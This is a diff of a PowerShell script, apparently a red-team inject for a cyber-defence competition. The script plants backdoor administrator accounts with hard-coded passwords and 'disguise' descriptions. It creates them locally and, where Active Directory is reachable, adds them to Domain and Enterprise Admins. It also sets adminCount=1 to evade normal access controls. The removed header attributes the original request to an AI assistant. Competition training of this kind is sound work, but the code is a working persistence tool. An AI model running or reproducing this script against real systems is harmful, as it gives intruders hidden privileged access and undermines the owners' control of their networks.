@@ -1,54 +1,38 @@
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 # CCDC User Injection
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
-# Claude 4.6
-# "now a ps1 script to create 3 users in the AD with admin perms. 
-# One is called sillyeviluser, another is removeme, and another is fakeuser."
+# THIS SCRIPT PUTS ROGUE USERS IN THE DEVICE
+#
+# Step 1 (always): creates local users and adds them to the local
+#                  Administrators group.
+# Step 2 (optional): if an AD domain controller is reachable and the
+#                    ActiveDirectory module is available, also creates the
+#                    same users as domain accounts in Domain Admins /
+#                    Administrators / Enterprise Admins.
+#
+# NOTE: #Requires -Modules ActiveDirectory is intentionally OMITTED.
+#       That directive terminates the entire PowerShell session when the
+#       module is absent.  We import it manually below and skip AD work
+#       gracefully if it isn't present.
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 
-# THIS SCRIPT PUTS ROGUE USERS IN THE DEVICE
-
 #Requires -RunAsAdministrator
-#Requires -Modules ActiveDirectory
 
 # -- Colour helpers ------------------------------------------------------------
 function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
 function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
 function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
 function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
+function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }
 
 Write-Host ""
 Write-Warn  "========================================================"
-Write-Warn  " CCDC Blue Team Training  -  AD Backdoor User Injector"
+Write-Warn  " CCDC Blue Team Training  -  Rogue User Injector"
 Write-Warn  "========================================================"
 Write-Host ""
-
-# -- Pull domain info dynamically ----------------------------------------------
-try {
-    $Domain     = Get-ADDomain -ErrorAction Stop
-    $DomainDN   = $Domain.DistinguishedName          # e.g. DC=corp,DC=local
-    $DomainName = $Domain.DNSRoot                    # e.g. corp.local
-    $DomainNetbios = $Domain.NetBIOSName             # e.g. CORP
-    Write-Info "Domain detected: $DomainName  ($DomainDN)"
-} catch {
-    Write-Err "Could not retrieve AD domain info. Is this a Domain Controller with the AD module installed?"
-    Write-Err "$_"
-    exit 1
-}
-
-# Target OU  -  Users container (works on any domain without customisation)
-$UsersOU = "CN=Users,$DomainDN"
-
-# -- Groups to add every backdoor user to -------------------------------------
-# These are the three highest-value groups in a standard AD environment.
-$AdminGroups = @(
-    "Domain Admins",
-    "Administrators",
-    "Enterprise Admins"
-)
 
 # -- User definitions ----------------------------------------------------------
-# Format: SamAccountName, DisplayName, password, description (disguise text)
+# Format: SamAccountName, DisplayName, Password, Description (disguise text)
 $EvilUsers = @(
     [PSCustomObject]@{
         Sam         = "JohnRedTeam"
@@ -71,70 +55,150 @@ $EvilUsers = @(
 )
 
 # =============================================================================
-# Create users and add to admin groups
+# STEP 1: Local users  (no AD required — works on any Windows machine)
 # =============================================================================
+Write-Section "LOCAL USER CREATION"
+
 foreach ($u in $EvilUsers) {
 
-    Write-Info "Processing user: $($u.Sam) ..."
-
+    Write-Info "Processing local user: $($u.Sam) ..."
     $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force
-    $UPN        = "$($u.Sam)@$DomainName"
 
-    # -- Create the user -------------------------------------------------------
-    $existing = Get-ADUser -Filter "SamAccountName -eq '$($u.Sam)'" -ErrorAction SilentlyContinue
-    if ($existing) {
-        Write-Warn "  User '$($u.Sam)' already exists  -  skipping creation, will still ensure group membership."
+    $existingLocal = Get-LocalUser -Name $u.Sam -ErrorAction SilentlyContinue
+    if ($existingLocal) {
+        Write-Warn "  Local user '$($u.Sam)' already exists  -  skipping creation."
     } else {
         try {
-            New-ADUser `
-                -SamAccountName       $u.Sam `
-                -UserPrincipalName    $UPN `
-                -Name                 $u.DisplayName `
-                -DisplayName          $u.DisplayName `
-                -GivenName            $u.Sam `
-                -Surname              "Training" `
+            New-LocalUser `
+                -Name                 $u.Sam `
+                -Password             $SecurePass `
+                -FullName             $u.DisplayName `
                 -Description          $u.Description `
-                -Path                 $UsersOU `
-                -AccountPassword      $SecurePass `
-                -Enabled              $true `
-                -PasswordNeverExpires $true `
-                -CannotChangePassword $false `
+                -PasswordNeverExpires:$true `
                 -ErrorAction          Stop
-
-            Write-Success "  Created user : $($u.Sam)"
-            Write-Success "  UPN          : $UPN"
-            Write-Success "  Password     : $($u.Password)"
+            Write-Success "  Created local user : $($u.Sam)"
+            Write-Success "  Password           : $($u.Password)"
         } catch {
-            Write-Err "  Failed to create user '$($u.Sam)': $_"
+            Write-Err "  Failed to create local user '$($u.Sam)': $_"
             continue
         }
     }
 
-    # -- Add to admin groups ---------------------------------------------------
-    foreach ($group in $AdminGroups) {
-        try {
-            Add-ADGroupMember -Identity $group -Members $u.Sam -ErrorAction Stop
-            Write-Success "  Added to group: $group"
-        } catch {
-            # Enterprise Admins only exists in forest root domain  -  warn gracefully
-            if ($group -eq "Enterprise Admins") {
-                Write-Warn "  Could not add to '$group' (only exists in forest root domain): $_"
-            } else {
-                Write-Err "  Failed to add '$($u.Sam)' to '$group': $_"
-            }
-        }
-    }
-
-    # -- Extra persistence: set adminCount=1 ----------------------------------
-    # adminCount=1 is set by SDProp on protected accounts. Setting it manually
-    # removes the account from normal ACL inheritance  -  a real attacker technique
-    # that makes the account harder to spot and restrict via standard tooling.
+    # Add to local Administrators group
     try {
-        Set-ADUser -Identity $u.Sam -Replace @{adminCount = 1} -ErrorAction Stop
-        Write-Success "  adminCount set to 1 (SDProp protection bypass)"
+        Add-LocalGroupMember -Group "Administrators" -Member $u.Sam -ErrorAction Stop
+        Write-Success "  Added to local Administrators group."
     } catch {
-        Write-Warn "  Could not set adminCount for '$($u.Sam)': $_"
+        if ($_ -match "already a member") {
+            Write-Warn "  '$($u.Sam)' is already in local Administrators."
+        } else {
+            Write-Err "  Failed to add '$($u.Sam)' to local Administrators: $_"
+        }
     }
 
     Write-Host ""
 }
+
+# =============================================================================
+# STEP 2: AD users  (optional — skipped gracefully if AD is unavailable)
+# =============================================================================
+Write-Section "ACTIVE DIRECTORY USER CREATION (optional)"
+
+$adAvailable = $false
+$DomainDN    = $null
+$DomainName  = $null
+
+try {
+    Import-Module ActiveDirectory -ErrorAction Stop
+    $adDomain   = Get-ADDomain -ErrorAction Stop
+    $DomainDN   = $adDomain.DistinguishedName   # e.g. DC=corp,DC=local
+    $DomainName = $adDomain.DNSRoot             # e.g. corp.local
+    $adAvailable = $true
+    Write-Info "Domain detected: $DomainName  ($DomainDN)"
+} catch {
+    Write-Warn "AD module or domain not available  -  skipping AD user creation."
+    Write-Warn "Reason: $_"
+    Write-Info "Local users were created successfully in Step 1."
+}
+
+if ($adAvailable) {
+
+    $UsersOU     = "CN=Users,$DomainDN"
+    $AdminGroups = @(
+        "Domain Admins",
+        "Administrators",
+        "Enterprise Admins"
+    )
+
+    foreach ($u in $EvilUsers) {
+
+        Write-Info "Processing AD user: $($u.Sam) ..."
+        $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force
+        $UPN        = "$($u.Sam)@$DomainName"
+
+        # -- Create the AD user ------------------------------------------------
+        $existing = Get-ADUser -Filter "SamAccountName -eq '$($u.Sam)'" -ErrorAction SilentlyContinue
+        if ($existing) {
+            Write-Warn "  AD user '$($u.Sam)' already exists  -  skipping creation, will still ensure group membership."
+        } else {
+            try {
+                New-ADUser `
+                    -SamAccountName       $u.Sam `
+                    -UserPrincipalName    $UPN `
+                    -Name                 $u.DisplayName `
+                    -DisplayName          $u.DisplayName `
+                    -GivenName            $u.Sam `
+                    -Surname              "Training" `
+                    -Description          $u.Description `
+                    -Path                 $UsersOU `
+                    -AccountPassword      $SecurePass `
+                    -Enabled              $true `
+                    -PasswordNeverExpires $true `
+                    -CannotChangePassword $false `
+                    -ErrorAction          Stop
+
+                Write-Success "  Created AD user : $($u.Sam)"
+                Write-Success "  UPN             : $UPN"
+                Write-Success "  Password        : $($u.Password)"
+            } catch {
+                Write-Err "  Failed to create AD user '$($u.Sam)': $_"
+                continue
+            }
+        }
+
+        # -- Add to domain admin groups ----------------------------------------
+        foreach ($group in $AdminGroups) {
+            try {
+                Add-ADGroupMember -Identity $group -Members $u.Sam -ErrorAction Stop
+                Write-Success "  Added to group: $group"
+            } catch {
+                if ($group -eq "Enterprise Admins") {
+                    Write-Warn "  Could not add to '$group' (only exists in forest root domain): $_"
+                } else {
+                    Write-Err "  Failed to add '$($u.Sam)' to '$group': $_"
+                }
+            }
+        }
+
+        # -- Extra persistence: adminCount=1 -----------------------------------
+        # Removes the account from normal ACL inheritance — harder to spot and
+        # restrict via standard tooling.
+        try {
+            Set-ADUser -Identity $u.Sam -Replace @{adminCount = 1} -ErrorAction Stop
+            Write-Success "  adminCount set to 1 (SDProp protection bypass)"
+        } catch {
+            Write-Warn "  Could not set adminCount for '$($u.Sam)': $_"
+        }
+
+        Write-Host ""
+    }
+}
+
+Write-Section "DONE"
+Write-Host ""
+Write-Info "Summary:"
+foreach ($u in $EvilUsers) {
+    Write-Host "  $($u.Sam.PadRight(20)) local admin" -ForegroundColor Green -NoNewline
+    if ($adAvailable) { Write-Host " + AD Domain Admin" -ForegroundColor Green } else { Write-Host "" }
+}
+Write-Host ""
